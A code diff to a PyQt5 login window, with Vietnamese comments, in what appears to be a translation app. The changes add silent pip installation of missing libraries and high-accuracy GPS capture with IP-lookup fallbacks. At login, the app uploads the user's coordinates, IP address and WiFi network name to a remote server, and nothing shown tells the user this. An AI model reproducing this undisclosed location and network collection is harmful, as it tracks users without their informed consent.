@@ -5,13 +5,57 @@ import requests
 import platform
 import socket
 import subprocess
+import random
+import string
+import re
+import uuid
+import time
+from datetime import datetime
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QFrame, QMessageBox, QCheckBox, QStackedWidget,
                             QGraphicsOpacityEffect)
 from PyQt5.QtGui import QIcon, QPixmap, QFont, QColor, QPainter, QBrush, QPen, QLinearGradient, QPainterPath
-from PyQt5.QtCore import Qt, QSize, QRect, QPropertyAnimation, QEasingCurve, pyqtProperty, QPoint, QParallelAnimationGroup, QSequentialAnimationGroup, QTimer
-import geocoder  # Thêm thư viện geocoder để lấy dữ liệu GPS
+from PyQt5.QtCore import Qt, QSize, QRect, QPropertyAnimation, QEasingCurve, pyqtProperty, QPoint, QParallelAnimationGroup, QSequentialAnimationGroup, QTimer, QCoreApplication
+
+# Thiết lập thuộc tính chia sẻ OpenGL contexts trước khi tạo QApplication
+QCoreApplication.setAttribute(Qt.AA_ShareOpenGLContexts)
+
+# Hàm kiểm tra và cài đặt thư viện
+def install_and_import(package):
+    """Hàm kiểm tra và cài đặt thư viện nếu chưa có"""
+    try:
+        __import__(package)
+        return True
+    except ImportError:
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+            print(f"Đã cài đặt thư viện {package}")
+            try:
+                __import__(package)
+                return True
+            except ImportError:
+                print(f"Không thể import thư viện {package} sau khi cài đặt")
+                return False
+        except Exception as e:
+            print(f"Không thể cài đặt thư viện {package}: {str(e)}")
+            return False
+
+# Cài đặt các thư viện cần thiết
+install_and_import('geocoder')
+install_and_import('geopy')
+install_and_import('requests')
+
+# Kiểm tra và cài đặt PyQtWebEngine
+try:
+    install_and_import('PyQtWebEngine')
+    HAS_WEB_ENGINE = True
+except Exception:
+    print("Không thể cài đặt PyQtWebEngine. Sẽ sử dụng phương pháp thay thế để lấy vị trí GPS.")
+    HAS_WEB_ENGINE = False
+
+# Tiếp tục với các import khác
+import geocoder
 
 def get_public_ip():
     try:
@@ -27,6 +71,7 @@ def get_os_info():
     return platform.system() + " " + platform.release()
 
 def get_wifi_name():
+    """Hàm lấy tên mạng WiFi đang kết nối"""
     try:
         if platform.system() == "Windows":
             result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], shell=True, text=True)
@@ -45,35 +90,330 @@ def get_wifi_name():
         pass
     return "Không xác định"
 
-def get_gps_location():
-    """Hàm lấy dữ liệu GPS từ địa chỉ IP"""
-    try:
-        g = geocoder.ip('me')
-        if g.ok:
-            return {
-                'latitude': g.lat,
-                'longitude': g.lng,
-                'city': g.city,
-                'country': g.country,
-                'address': g.address
-            }
-        else:
-            return {
-                'latitude': None,
-                'longitude': None,
-                'city': None,
-                'country': None,
-                'address': 'Không thể lấy vị trí GPS'
-            }
-    except Exception as e:
-        print(f"Lỗi khi lấy vị trí GPS: {str(e)}")
-        return {
-            'latitude': None,
-            'longitude': None,
-            'city': None,
-            'country': None,
-            'address': f'Lỗi: {str(e)}'
-        }
+def get_detailed_gps_location():
+    """Hàm lấy dữ liệu GPS từ thiết bị với độ chính xác cao"""
+    # Khởi tạo location_data
+    location_data = {
+        'x': None,
+        'y': None,
+        'address': 'Không xác định'
+    }
+    
+    # Kiểm tra xem có thể import QtWebEngineWidgets không
+    has_web_engine_widgets = False
+    if HAS_WEB_ENGINE:
+        try:
+            from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEnginePage
+            from PyQt5.QtCore import QUrl, QEventLoop
+            from PyQt5.QtWidgets import QApplication
+            has_web_engine_widgets = True
+            print("Đã import thành công PyQt5.QtWebEngineWidgets")
+        except ImportError as e:
+            print(f"Không thể import PyQt5.QtWebEngineWidgets: {str(e)}. Sẽ sử dụng phương pháp thay thế.")
+    
+    # Nếu có QtWebEngineWidgets, sử dụng HTML5 Geolocation API
+    if has_web_engine_widgets:
+        import json
+        import os
+        import time
+        
+        try:
+            class GPSWebPage(QWebEnginePage):
+                def __init__(self):
+                    super().__init__()
+                    self.location_data = None
+                    self.loadFinished.connect(self._on_load_finished)
+                    self.loop = QEventLoop()
+                    
+                def _on_load_finished(self):
+                    self.runJavaScript("""
+                        var sendLocation = function(position) {
+                            var coords = position.coords;
+                            var locationData = {
+                                latitude: coords.latitude,
+                                longitude: coords.longitude,
+                                accuracy: coords.accuracy,
+                                altitude: coords.altitude,
+                                altitudeAccuracy: coords.altitudeAccuracy,
+                                heading: coords.heading,
+                                speed: coords.speed
+                            };
+                            window.location_data = JSON.stringify(locationData);
+                        };
+                        
+                        var handleError = function(error) {
+                            window.location_data = JSON.stringify({
+                                error: error.message,
+                                code: error.code
+                            });
+                        };
+                        
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                sendLocation, 
+                                handleError,
+                                {
+                                    enableHighAccuracy: true,
+                                    timeout: 10000,
+                                    maximumAge: 0
+                                }
+                            );
+                        } else {
+                            window.location_data = JSON.stringify({
+                                error: 'Geolocation is not supported by this browser.'
+                            });
+                        }
+                        
+                        // Kiểm tra kết quả sau 1 giây
+                        setTimeout(function() {
+                            return window.location_data;
+                        }, 1000);
+                    """, self._handle_location)
+                    
+                def _handle_location(self, result):
+                    if result:
+                        try:
+                            self.location_data = json.loads(result)
+                        except:
+                            self.location_data = {"error": "Không thể parse dữ liệu JSON"}
+                    else:
+                        # Thử lại sau 1 giây nếu chưa có kết quả
+                        self.runJavaScript("return window.location_data;", self._handle_location)
+                        return
+                        
+                    self.loop.quit()
+            
+            # Tạo HTML file tạm thời để lấy vị trí
+            html_content = """
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Lấy vị trí GPS</title>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        text-align: center;
+                        padding: 20px;
+                        background: linear-gradient(135deg, #6a11cb, #2575fc);
+                        color: white;
+                        height: 100vh;
+                        margin: 0;
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                    }
+                    .container {
+                        background-color: rgba(255, 255, 255, 0.1);
+                        padding: 30px;
+                        border-radius: 10px;
+                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                        max-width: 500px;
+                        width: 100%;
+                    }
+                    h1 {
+                        margin-bottom: 20px;
+                    }
+                    p {
+                        font-size: 16px;
+                        line-height: 1.6;
+                    }
+                    .loader {
+                        border: 5px solid #f3f3f3;
+                        border-top: 5px solid #3498db;
+                        border-radius: 50%;
+                        width: 50px;
+                        height: 50px;
+                        animation: spin 2s linear infinite;
+                        margin: 20px auto;
+                    }
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>Đang lấy vị trí GPS</h1>
+                    <div class="loader"></div>
+                    <p>Vui lòng chờ trong giây lát...</p>
+                    <p>Hệ thống đang xác định vị trí chính xác của bạn.</p>
+                    <p>Nếu trình duyệt hỏi quyền truy cập vị trí, vui lòng chọn "Cho phép".</p>
+                </div>
+            </body>
+            </html>
+            """
+            
+            temp_html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp_gps.html")
+            with open(temp_html_path, "w", encoding="utf-8") as f:
+                f.write(html_content)
+            
+            # Khởi tạo ứng dụng Qt nếu chưa có
+            app = QApplication.instance()
+            if not app:
+                app = QApplication([])
+            
+            # Tạo cửa sổ web để lấy vị trí
+            view = QWebEngineView()
+            page = GPSWebPage()
+            view.setPage(page)
+            view.setWindowTitle("Đang lấy vị trí GPS")
+            view.resize(600, 400)
+            
+            # Load file HTML
+            view.load(QUrl.fromLocalFile(temp_html_path))
+            view.show()
+            
+            # Chờ tối đa 15 giây để lấy vị trí
+            timer = QTimer()
+            timer.setSingleShot(True)
+            timer.timeout.connect(page.loop.quit)
+            timer.start(15000)
+            
+            # Chạy event loop
+            page.loop.exec_()
+            
+            # Đóng cửa sổ web
+            view.close()
+            
+            # Xóa file HTML tạm
+            try:
+                os.remove(temp_html_path)
+            except:
+                pass
+            
+            # Xử lý kết quả
+            if page.location_data:
+                if 'error' not in page.location_data:
+                    # Lấy vị trí thành công từ HTML5 Geolocation API
+                    lat = page.location_data.get('latitude')
+                    lng = page.location_data.get('longitude')
+                    
+                    if lat and lng:
+                        location_data['x'] = lng
+                        location_data['y'] = lat
+                        
+                        # Sử dụng Nominatim để lấy địa chỉ từ tọa độ
+                        try:
+                            from geopy.geocoders import Nominatim
+                            geolocator = Nominatim(user_agent="translate_app")
+                            location = geolocator.reverse(f"{lat}, {lng}")
+                            if location and location.address:
+                                # Rút gọn địa chỉ
+                                address_parts = location.address.split(', ')
+                                if len(address_parts) > 3:
+                                    # Lấy thành phố, tỉnh/bang, quốc gia
+                                    location_data['address'] = ', '.join(address_parts[-3:])
+                                else:
+                                    location_data['address'] = location.address
+                            else:
+                                location_data['address'] = f"{lat}, {lng}"
+                        except Exception as e:
+                            print(f"Lỗi khi lấy địa chỉ từ tọa độ: {str(e)}")
+                            location_data['address'] = f"{lat}, {lng}"
+                        
+                        print(f"Lấy vị trí thành công từ HTML5 Geolocation API với độ chính xác: {page.location_data.get('accuracy', 'không xác định')} mét")
+                else:
+                    print(f"Lỗi khi lấy vị trí từ HTML5 Geolocation API: {page.location_data.get('error')}")
+        except Exception as e:
+            print(f"Lỗi khi sử dụng HTML5 Geolocation API: {str(e)}")
+            print("Chuyển sang phương pháp thay thế...")
+    else:
+        print("Sử dụng phương pháp thay thế để lấy vị trí GPS...")
+    
+    # Nếu không lấy được vị trí từ HTML5 Geolocation API, thử các phương pháp khác
+    if location_data['x'] is None:
+        # Phương pháp 1: Sử dụng geocoder với nhiều providers
+        providers = ['ipinfo', 'geonames', 'arcgis', 'w3w', 'osm']
+        
+        for provider in providers:
+            try:
+                if provider == 'ipinfo':
+                    g = geocoder.ipinfo('me')
+                elif provider == 'geonames':
+                    g = geocoder.geonames('me')
+                elif provider == 'arcgis':
+                    g = geocoder.arcgis('me')
+                elif provider == 'w3w':
+                    g = geocoder.w3w('me')
+                elif provider == 'osm':
+                    g = geocoder.osm('me')
+                
+                if g.ok:
+                    # Rút gọn địa chỉ
+                    if hasattr(g, 'address') and g.address:
+                        address = g.address
+                    elif hasattr(g, 'city') and hasattr(g, 'country') and g.city and g.country:
+                        address = f"{g.city}, {g.country}"
+                    else:
+                        address = "Không xác định"
+                    
+                    location_data = {
+                        'x': g.lng,
+                        'y': g.lat,
+                        'address': address
+                    }
+                    print(f"Lấy vị trí thành công từ provider: {provider}")
+                    break
+            except Exception as e:
+                print(f"Lỗi khi sử dụng provider {provider}: {str(e)}")
+        
+        # Phương pháp 2: Sử dụng IP-API nếu các providers trên không hoạt động
+        if location_data['x'] is None:
+            try:
+                response = requests.get('http://ip-api.com/json/')
+                if response.status_code == 200:
+                    data = response.json()
+                    if data.get('status') == 'success':
+                        # Rút gọn địa chỉ
+                        city = data.get('city', '')
+                        region = data.get('regionName', '')
+                        country = data.get('country', '')
+                        address_parts = [part for part in [city, region, country] if part]
+                        address = ', '.join(address_parts) if address_parts else "Không xác định"
+                        
+                        location_data = {
+                            'x': data.get('lon'),
+                            'y': data.get('lat'),
+                            'address': address
+                        }
+                        print("Lấy vị trí thành công từ IP-API")
+            except Exception as e:
+                print(f"Lỗi khi sử dụng IP-API: {str(e)}")
+        
+        # Phương pháp 3: Sử dụng ipapi.co nếu các phương pháp trên không hoạt động
+        if location_data['x'] is None:
+            try:
+                response = requests.get('https://ipapi.co/json/')
+                if response.status_code == 200:
+                    data = response.json()
+                    # Rút gọn địa chỉ
+                    city = data.get('city', '')
+                    region = data.get('region', '')
+                    country = data.get('country_name', '')
+                    address_parts = [part for part in [city, region, country] if part]
+                    address = ', '.join(address_parts) if address_parts else "Không xác định"
+                    
+                    location_data = {
+                        'x': data.get('longitude'),
+                        'y': data.get('latitude'),
+                        'address': address
+                    }
+                    print("Lấy vị trí thành công từ ipapi.co")
+            except Exception as e:
+                print(f"Lỗi khi sử dụng ipapi.co: {str(e)}")
+    
+    # Định dạng thông tin vị trí theo yêu cầu
+    location_str = f"Thông tin vị trí: {location_data['y']}, {location_data['x']} - {location_data['address']}"
+    print(location_str)
+    
+    # Thêm thuộc tính location_str vào location_data
+    location_data['location_str'] = location_str
+    
+    return location_data
 
 class CurvedPanel(QWidget):
     def __init__(self, parent=None):
@@ -992,7 +1332,7 @@ class LoginWindow(QMainWindow):
                 wifi_name = get_wifi_name()
                 
                 # Lấy thông tin GPS
-                gps_info = get_gps_location()
+                gps_info = get_detailed_gps_location()
                 
                 # Xác định hệ điều hành hiện tại
                 current_os = platform.system()
@@ -1028,7 +1368,8 @@ class LoginWindow(QMainWindow):
                 requests.post('https://web-production-baac.up.railway.app/update_user_info', json={
                     'account': username, 
                     'ip': ip_address,
-                    'gps_info': gps_info
+                    'gps_info': gps_info,
+                    'wifi_name': wifi_name
                 })
                 
                 # In ra thông tin
